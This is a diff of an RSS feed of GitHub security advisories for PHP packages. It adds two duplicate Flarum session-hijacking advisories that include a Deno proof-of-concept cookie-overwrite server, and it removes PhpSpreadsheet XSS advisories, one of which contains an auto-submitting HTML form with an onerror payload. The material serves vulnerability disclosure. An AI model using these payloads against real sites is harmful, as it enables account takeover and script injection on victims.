@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2025-03-12T22:01:15.140Z</updated>
+    <updated>2025-03-12T23:01:23.189Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,256 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[flarum/framework] Flarum Vulnerable to Session Hijacking via Authoritative Subdomain Cookie Overwrite]]></title>
+        <id>https://github.com/advisories/GHSA-hg9j-64wp-m9px</id>
+        <link href="https://github.com/advisories/GHSA-hg9j-64wp-m9px"/>
+        <updated>2025-03-12T22:06:19.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>A session hijacking vulnerability exists when an attacker-controlled <strong>authoritative subdomain</strong> under a parent domain (e.g., <code>subdomain.host.com</code>) sets cookies scoped to the parent domain (<code>.host.com</code>). This allows session token replacement for applications hosted on sibling subdomains (e.g., <code>community.host.com</code>) if session tokens aren't rotated post-authentication.  </p>
+<p><strong>Key Constraints</strong>:  </p>
+<ul>
+<li>Attacker must control <strong>any subdomain</strong> under the parent domain (e.g., <code>evil.host.com</code> or <code>x.y.host.com</code>).  </li>
+<li>Parent domain must <strong>not</strong> be on the <a href="https://publicsuffix.org/">Public Suffix List</a>.</li>
+</ul>
+<p>Due to non-existent session token rotation after authenticating we can theoretically reproduce the vulnerability by using browser dev tools, but due to the browser's security measures this does not seem to be exploitable as described.</p>
+<hr>
+<h2 id="proof-of-concept-deno"><strong>Proof of Concept (Deno)</strong></h2>
+<pre><code class="language-ts">Deno.serve({
+    port: 8000, // default
+    hostname: 'localhost',
+    onListen: (o) =&gt; console.log(`Server started at http://${o.hostname}:${o.port}`, o),
+  },
+  async (req) =&gt; (console.log(req), new Response(
+    `You've been served! You came from ${req.headers.get('referer')}`,
+    {
+      //status: 302, // would redirect user to page they came from
+      status: 200,
+      headers: {
+        'set-cookie': 'session_cookie=mytoken; Domain=.deno.dev; Secure; HttpOnly',
+        'location': req.headers.get('referer')
+      }
+    }
+  ))
+);
+</code></pre>
+<h3 id="attack-flow"><strong>Attack Flow</strong></h3>
+<ol>
+<li><strong>Attacker Setup</strong>: Hosts server at <code>evil.host.com</code>.</li>
+<li><strong>Harvest Session Token</strong>: Attacker visits <code>community.host.com</code> to get a session token for himself to replace the victim's token with his own.</li>
+<li><strong>Victim Interaction</strong>: User clicks link to <code>https://evil.host.com</code>.  </li>
+<li><strong>Cookie Override</strong>: Server sets cookie with <code>Domain=.host.com</code> and the harvested token from step 2.  </li>
+<li><strong>Session Hijacking</strong>: Victim's future requests to <code>community.host.com</code> use attacker's token.</li>
+</ol>
+<hr>
+<h2 id="why-reverse-dns-subdomains-fail"><strong>Why Reverse DNS Subdomains Fail</strong></h2>
+<p>Browsers block cookie setting for parent domains unless:  </p>
+<ol>
+<li><strong>Authoritative Subdomain</strong>: Server must belong to a direct child domain (e.g., <code>a.host.com</code>, not <code>x.y.host.com</code>).  </li>
+<li><strong>Public Suffix Exclusion</strong>: If <code>host.com</code> is on the Public Suffix List (e.g., like <code>github.io</code>), browsers block cross-subdomain cookies.</li>
+</ol>
+<p><strong>Example</strong>:  </p>
+<ul>
+<li>❌ <code>123.cust.dynamic.host.com</code> → Cannot set <code>Domain=.host.com</code>.  </li>
+<li>✅ <code>evil.host.com</code> → Can set <code>Domain=.host.com</code> (if not on PSL).</li>
+</ul>
+<hr>
+<h2 id="browser-security-behavior"><strong>Browser Security Behavior</strong></h2>
+<h3 id="1-cookie-domain-validation">1. <strong>Cookie Domain Validation</strong></h3>
+<p>Per <a href="https://datatracker.ietf.org/doc/html/rfc6265#section-5.3">RFC 6265 §5.3</a>:  </p>
+<blockquote>
+<p>Cookies can only be set for domains the server is authoritative for.  </p>
+</blockquote>
+<h3 id="2-public-suffix-list-psl">2. <strong>Public Suffix List (PSL)</strong></h3>
+<p>Domains like <code>host.com</code> on the PSL trigger browser protections:  </p>
+<blockquote>
+<p>Subdomains of PSL-listed domains cannot set cookies for parent domains.  </p>
+</blockquote>
+<p><strong>Verification</strong>:  </p>
+<ul>
+<li>Check PSL status: <a href="https://publicsuffix.org/list/">https://publicsuffix.org/list/</a></li>
+</ul>
+<hr>
+<h2 id="impact"><strong>Impact</strong></h2>
+<ul>
+<li><strong>Account Takeover</strong>: Attacker gains authenticated session access.</li>
+<li><strong>Data Exposure</strong>: Email, private messages, and other personal data exposed.</li>
+<li><strong>Exploitable Only If</strong>:  <ul>
+<li>Parent domain is <strong>not</strong> PSL-listed.  </li>
+<li>Attacker controls <strong>direct child subdomain</strong> (e.g., <code>evil.host.com</code>).</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="remediation"><strong>Remediation</strong></h2>
+<ol>
+<li><strong>Session Token Rotation</strong>:  <pre><code class="language-ts">// After authentication:
+invalidateOldSession();
+const newToken = generateToken();
+</code></pre>
+</li>
+<li><strong>Cookie Scoping (already in place)</strong>:  <pre><code class="language-ts">// Restrict cookies to explicit subdomain:
+"Set-Cookie": "session=token; Domain=community.host.com; Secure; HttpOnly; SameSite=Lax";
+</code></pre>
+</li>
+<li><strong>Public Suffix Registration</strong>:<br>Add <code>host.com</code> to the Public Suffix List via <a href="https://publicsuffix.org/submit/">PSL Submission</a>.</li>
+</ol>
+<hr>
+<h2 id="revised-vulnerability-criteria"><strong>Revised Vulnerability Criteria</strong></h2>
+<p><strong>Prerequisites</strong>:  </p>
+<ul>
+<li>Attacker controls authoritative subdomain (e.g., <code>evil.host.com</code>).  </li>
+<li>Parent domain (<code>host.com</code>) is <strong>not</strong> PSL-listed.  </li>
+<li>Session tokens persist post-authentication.</li>
+</ul>
+<hr>
+<h2 id="references"><strong>References</strong></h2>
+<ul>
+<li><a href="https://tools.ietf.org/html/rfc6265">RFC 6265: HTTP Cookie Handling</a>  </li>
+<li><a href="https://publicsuffix.org/">Public Suffix List</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/flarum/framework/security/advisories/GHSA-hg9j-64wp-m9px">https://github.com/flarum/framework/security/advisories/GHSA-hg9j-64wp-m9px</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27794">https://nvd.nist.gov/vuln/detail/CVE-2025-27794</a></li>
+<li><a href="https://github.com/flarum/framework/commit/a05aaea3ee1e0a8b870935183193cd6052f1d402">https://github.com/flarum/framework/commit/a05aaea3ee1e0a8b870935183193cd6052f1d402</a></li>
+<li><a href="https://github.com/flarum/framework/releases/tag/v1.8.10">https://github.com/flarum/framework/releases/tag/v1.8.10</a></li>
+<li><a href="https://github.com/advisories/GHSA-hg9j-64wp-m9px">https://github.com/advisories/GHSA-hg9j-64wp-m9px</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hg9j-64wp-m9px</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-12T22:06:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[flarum/core] Flarum Vulnerable to Session Hijacking via Authoritative Subdomain Cookie Overwrite]]></title>
+        <id>https://github.com/advisories/GHSA-hg9j-64wp-m9px</id>
+        <link href="https://github.com/advisories/GHSA-hg9j-64wp-m9px"/>
+        <updated>2025-03-12T22:06:19.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary"><strong>Summary</strong></h2>
+<p>A session hijacking vulnerability exists when an attacker-controlled <strong>authoritative subdomain</strong> under a parent domain (e.g., <code>subdomain.host.com</code>) sets cookies scoped to the parent domain (<code>.host.com</code>). This allows session token replacement for applications hosted on sibling subdomains (e.g., <code>community.host.com</code>) if session tokens aren't rotated post-authentication.  </p>
+<p><strong>Key Constraints</strong>:  </p>
+<ul>
+<li>Attacker must control <strong>any subdomain</strong> under the parent domain (e.g., <code>evil.host.com</code> or <code>x.y.host.com</code>).  </li>
+<li>Parent domain must <strong>not</strong> be on the <a href="https://publicsuffix.org/">Public Suffix List</a>.</li>
+</ul>
+<p>Due to non-existent session token rotation after authenticating we can theoretically reproduce the vulnerability by using browser dev tools, but due to the browser's security measures this does not seem to be exploitable as described.</p>
+<hr>
+<h2 id="proof-of-concept-deno"><strong>Proof of Concept (Deno)</strong></h2>
+<pre><code class="language-ts">Deno.serve({
+    port: 8000, // default
+    hostname: 'localhost',
+    onListen: (o) =&gt; console.log(`Server started at http://${o.hostname}:${o.port}`, o),
+  },
+  async (req) =&gt; (console.log(req), new Response(
+    `You've been served! You came from ${req.headers.get('referer')}`,
+    {
+      //status: 302, // would redirect user to page they came from
+      status: 200,
+      headers: {
+        'set-cookie': 'session_cookie=mytoken; Domain=.deno.dev; Secure; HttpOnly',
+        'location': req.headers.get('referer')
+      }
+    }
+  ))
+);
+</code></pre>
+<h3 id="attack-flow"><strong>Attack Flow</strong></h3>
+<ol>
+<li><strong>Attacker Setup</strong>: Hosts server at <code>evil.host.com</code>.</li>
+<li><strong>Harvest Session Token</strong>: Attacker visits <code>community.host.com</code> to get a session token for himself to replace the victim's token with his own.</li>
+<li><strong>Victim Interaction</strong>: User clicks link to <code>https://evil.host.com</code>.  </li>
+<li><strong>Cookie Override</strong>: Server sets cookie with <code>Domain=.host.com</code> and the harvested token from step 2.  </li>
+<li><strong>Session Hijacking</strong>: Victim's future requests to <code>community.host.com</code> use attacker's token.</li>
+</ol>
+<hr>
+<h2 id="why-reverse-dns-subdomains-fail"><strong>Why Reverse DNS Subdomains Fail</strong></h2>
+<p>Browsers block cookie setting for parent domains unless:  </p>
+<ol>
+<li><strong>Authoritative Subdomain</strong>: Server must belong to a direct child domain (e.g., <code>a.host.com</code>, not <code>x.y.host.com</code>).  </li>
+<li><strong>Public Suffix Exclusion</strong>: If <code>host.com</code> is on the Public Suffix List (e.g., like <code>github.io</code>), browsers block cross-subdomain cookies.</li>
+</ol>
+<p><strong>Example</strong>:  </p>
+<ul>
+<li>❌ <code>123.cust.dynamic.host.com</code> → Cannot set <code>Domain=.host.com</code>.  </li>
+<li>✅ <code>evil.host.com</code> → Can set <code>Domain=.host.com</code> (if not on PSL).</li>
+</ul>
+<hr>
+<h2 id="browser-security-behavior"><strong>Browser Security Behavior</strong></h2>
+<h3 id="1-cookie-domain-validation">1. <strong>Cookie Domain Validation</strong></h3>
+<p>Per <a href="https://datatracker.ietf.org/doc/html/rfc6265#section-5.3">RFC 6265 §5.3</a>:  </p>
+<blockquote>
+<p>Cookies can only be set for domains the server is authoritative for.  </p>
+</blockquote>
+<h3 id="2-public-suffix-list-psl">2. <strong>Public Suffix List (PSL)</strong></h3>
+<p>Domains like <code>host.com</code> on the PSL trigger browser protections:  </p>
+<blockquote>
+<p>Subdomains of PSL-listed domains cannot set cookies for parent domains.  </p>
+</blockquote>
+<p><strong>Verification</strong>:  </p>
+<ul>
+<li>Check PSL status: <a href="https://publicsuffix.org/list/">https://publicsuffix.org/list/</a></li>
+</ul>
+<hr>
+<h2 id="impact"><strong>Impact</strong></h2>
+<ul>
+<li><strong>Account Takeover</strong>: Attacker gains authenticated session access.</li>
+<li><strong>Data Exposure</strong>: Email, private messages, and other personal data exposed.</li>
+<li><strong>Exploitable Only If</strong>:  <ul>
+<li>Parent domain is <strong>not</strong> PSL-listed.  </li>
+<li>Attacker controls <strong>direct child subdomain</strong> (e.g., <code>evil.host.com</code>).</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="remediation"><strong>Remediation</strong></h2>
+<ol>
+<li><strong>Session Token Rotation</strong>:  <pre><code class="language-ts">// After authentication:
+invalidateOldSession();
+const newToken = generateToken();
+</code></pre>
+</li>
+<li><strong>Cookie Scoping (already in place)</strong>:  <pre><code class="language-ts">// Restrict cookies to explicit subdomain:
+"Set-Cookie": "session=token; Domain=community.host.com; Secure; HttpOnly; SameSite=Lax";
+</code></pre>
+</li>
+<li><strong>Public Suffix Registration</strong>:<br>Add <code>host.com</code> to the Public Suffix List via <a href="https://publicsuffix.org/submit/">PSL Submission</a>.</li>
+</ol>
+<hr>
+<h2 id="revised-vulnerability-criteria"><strong>Revised Vulnerability Criteria</strong></h2>
+<p><strong>Prerequisites</strong>:  </p>
+<ul>
+<li>Attacker controls authoritative subdomain (e.g., <code>evil.host.com</code>).  </li>
+<li>Parent domain (<code>host.com</code>) is <strong>not</strong> PSL-listed.  </li>
+<li>Session tokens persist post-authentication.</li>
+</ul>
+<hr>
+<h2 id="references"><strong>References</strong></h2>
+<ul>
+<li><a href="https://tools.ietf.org/html/rfc6265">RFC 6265: HTTP Cookie Handling</a>  </li>
+<li><a href="https://publicsuffix.org/">Public Suffix List</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/flarum/framework/security/advisories/GHSA-hg9j-64wp-m9px">https://github.com/flarum/framework/security/advisories/GHSA-hg9j-64wp-m9px</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27794">https://nvd.nist.gov/vuln/detail/CVE-2025-27794</a></li>
+<li><a href="https://github.com/flarum/framework/commit/a05aaea3ee1e0a8b870935183193cd6052f1d402">https://github.com/flarum/framework/commit/a05aaea3ee1e0a8b870935183193cd6052f1d402</a></li>
+<li><a href="https://github.com/flarum/framework/releases/tag/v1.8.10">https://github.com/flarum/framework/releases/tag/v1.8.10</a></li>
+<li><a href="https://github.com/advisories/GHSA-hg9j-64wp-m9px">https://github.com/advisories/GHSA-hg9j-64wp-m9px</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hg9j-64wp-m9px</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2025-03-12T22:06:16.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[laravel/framework] Laravel has a File Validation Bypass]]></title>
         <id>https://github.com/advisories/GHSA-78fx-h6xr-vch4</id>
@@ -853,133 +1103,5 @@ Strings are formed using the currency parameter without sanitization, which is c
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-01-03T16:05:26.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file]]></title>
-        <id>https://github.com/advisories/GHSA-j2xg-cjcx-4677</id>
-        <link href="https://github.com/advisories/GHSA-j2xg-cjcx-4677"/>
-        <updated>2025-03-06T18:18:56.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-currencyphp-file">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>
-<p><strong>Product</strong>: Phpspreadsheet
-<strong>Version</strong>: version 3.6.0
-<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
-<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
-<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
-<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack
-<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
-<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file
-<strong>Exploitation conditions</strong>: an unauthorized user
-<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable
-<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
-<h1 id="research">Research</h1>
-<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>
-<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.
-Strings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>
-<p><img alt="fig9" src="https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c"></p>
-<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
-<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
-<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
-<pre><code>&lt;html&gt;
-  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
-  &lt;body&gt;
-    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php" method="POST"&gt;
-      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
-      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
-      &lt;input type="hidden" name="decimals" value="2" /&gt;
-      &lt;input type="hidden" name="position" value="1" /&gt;
-      &lt;input type="hidden" name="spacing" value="0" /&gt;
-      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
-      &lt;input type="submit" value="Submit request" /&gt;
-    &lt;/form&gt;
-    &lt;script&gt;
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    &lt;/script&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>
-<img src="https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335" alt="fig10" width="428">
-
-<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>
-<h1 id="credit">Credit</h1>
-<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>
-<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56409">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>
-<li><a href="https://github.com/advisories/GHSA-j2xg-cjcx-4677">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j2xg-cjcx-4677</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-01-03T17:06:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phpoffice/phpexcel] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties]]></title>
-        <id>https://github.com/advisories/GHSA-wv23-996v-q229</id>
-        <link href="https://github.com/advisories/GHSA-wv23-996v-q229"/>
-        <updated>2025-03-06T18:18:13.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-in-custom-properties">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>
-<p><strong>Product</strong>: Phpspreadsheet
-<strong>Version</strong>: version 3.6.0
-<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
-<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
-<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
-<strong>Description</strong>: the HTML page is generated without clearing custom properties
-<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
-<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateMeta</code>
-<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
-<strong>Mitigation</strong>: additional sanitization of special characters in a string
-<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
-<h1 id="research">Research</h1>
-<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
-The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
-<p><em>Listing 9. Source code on the server</em></p>
-<pre><code>&lt;?php
-
-require __DIR__ . '/vendor/autoload.php';
-
-$inputFileName = './doc/Book1.xlsx';
-$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
-$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
-print($writer-&gt;generateHTMLAll());
-</code></pre>
-<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
-The Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>
-<p><img alt="fig17" src="https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f"></p>
-<p><em>Figure 17. Embedding the payload</em></p>
-<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
-<p><img alt="fig18" src="https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc"></p>
-<p><em>Figure 18. Getting a custom property</em></p>
-<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>
-<p><img alt="fig19" src="https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86"></p>
-<p><em>Figure 19. Getting a custom property</em></p>
-<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>
-<img src="https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef" alt="fig20" width="356">
-
-<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>
-<h1 id="credit">Credit</h1>
-<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>
-<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56410">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>
-<li><a href="https://github.com/advisories/GHSA-wv23-996v-q229">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wv23-996v-q229</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-01-03T17:25:45.000Z</published>
     </entry>
 </feed>
